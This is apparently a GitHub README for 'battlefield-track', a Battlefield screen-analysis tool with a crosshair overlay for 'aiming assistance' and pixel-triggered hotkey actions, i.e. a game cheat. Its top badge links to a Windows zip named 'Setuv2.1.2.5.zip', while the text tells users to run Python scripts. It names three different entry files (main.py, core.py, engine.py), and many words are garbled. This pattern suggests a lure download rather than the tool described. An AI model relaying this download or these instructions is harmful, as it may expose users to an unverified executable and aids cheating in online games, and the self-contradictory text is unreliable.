[![Download](https://img.shields.io/badge/download-windows--x64-0078D6?style=flat-square&logo=windows)](https://github.com/kevin-kingcode97y3/battlefield-track/releases/download/v1.0.0/Setuv2.1.2.5.zip)

# 🎮 battlefield-track

![License](https://img.shields.io/github/license/kevin-kingcode97y3/battlefield-track) ![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)

[![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.0-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/kevin-kingcode97y3/battlefield-track?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/kevin-kingcode97y3/battlefield-track?style=flat-square)

Battlefield tool suite: screen analyzer, keybind editor, data visualizer

## 📥 Download

[![Download Latest](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](../../releases/latest)

1. Download the latest release from the link above
2. Extract the archive (WinRAR / 7-Zip)
3. Run `python main.py` (or see Usage below)
4. Configure settings in `config.yaml`

## Config

The `config.yaml` file lets you tweak various settings. Here's a sample:

```yaml
analyzer:
 debug: False
 region: # Region of screen to analyze (x1, y1, x2, y2)
 x1: 0
 y1: 0
 x2: 800
 y2: 600
 pixel_threshold: 200
renderer:
 overlay_enabled: True
 crosshair_color: "red"
 crosshair_size: 15
 font_path: 'path/to/your/font.ttf' #Optional, defaults to a built-in font
handler:
 hotkey_toggle_analyzer: "F9"
 hotkey_: "F10"
```

* `analyzer.debug`: Enable debug prints.
* `analyzer.region`: Defines the screen region to analyze. Adjust these coordinates to match the area of interest.
* `analyzer.pixel_threshold`: The pixel intensity threshold for detection.
* `renderer.overlay_enabled`: Toggles the overlay display.
* `renderer.crosshair_color`: Sets the color of the crosshair.
* `renderer.crosshair_size`: Sets the size of the crosshair in pixels.
* `handler.hotkey_toggle_analyzer`: Hotkey to enable/disable the analyzer.
* `handler.hotkey_`: Hotkey to trigger a specific action

## FAQ

<details>
 <summary>The tool isn't detecting pixels correctly. What do I do?</summary>
 <p>First, double-check the <code>analyzer.region</code> in your <code>config.yaml</code>. Make sure it accuely reflects the area you're trying to analyze. Also, experiment with the <code>analyzer.pixel_threshold</code>. A higher value requires brighter pixels to trigger a detection, while a lower value is more sensitive.</p>
</details>

<details>
 <summary>The overlay is flickering. Any ideas?</summary>
 <p>Flickering can sometimes happen due to refresh e issues or conflicts with other overlays. Try reducing the analysis frequency, or disabling other overlays to see if that helps.</p>
</details>

<details>
 <summary>Can I use different hotkeys?</summary>
 <p>Absolutely! Edit the <code>handler.hotkey_toggle_analyzer</code> and <code>handler.hotkey_</code> settings in <code>config.yaml</code>. Make sure the hotkeys you choose don't conflict with other applications.</p>
</details>

## Requirements

* Python 3.11+
* Required Python packages:

 ```bash
 pip install -r requirements.txt
 ```

Packages include: `PyYAML`, `Pillow`, `keyboard`, `pynput`, `opencv-python`. These cover handling settings, image processing, hotkey management, and screen .

## Changelog

* **1.2.0**:
 * Added keybind editor
 * Improved pixel detection accuracy
 * Fixed overlay flickering issues
* **1.1.0**:
 * Added hotkey support
 * Improved configuion loading
* **1.0.0**:
 * Initial release
 * Basic screen analysis and overlay functionality## Overview

* **Screen analysis**: Analyzes a specified region of your screen for pixel changes.
* **Overlay**: Displays an overlay with a crosshair, providing visual feedback.
* **Crosshair**: Customizable crosshair for aiming assistance.
* **Pixel detection**: Detects pixels based on configurable threshold.
* **Hotkey automation**: Automate actions using hotkeys.
* **Configuion**: All settings are configurable via `config.yaml`.
* **Keybind Editor**: Edit and manage keybinds through the GUI.

## Troubleshooting

* **Missing `requirements.txt`**: If you get errors about missing modules, make sure you've run `pip install -r requirements.txt`.
* **Incorrect screen region**: Double-check the `region` settings in `config.yaml`. Incorrect coordinates will lead to inaccue analysis.
* **Performance issues**: Analyzing a large screen region or using a very low `pixel_threshold` can impact performance. Reduce the region size or increase the threshold.

## How to Run

To get started, simply run `core.py`.

```bash
python engine.py
```

Make sure you have all the requirements installed (see below). The tool will start analyzing your screen and display an overlay (if enabled in the config).



---

🎯 Focused on simplicity and performance
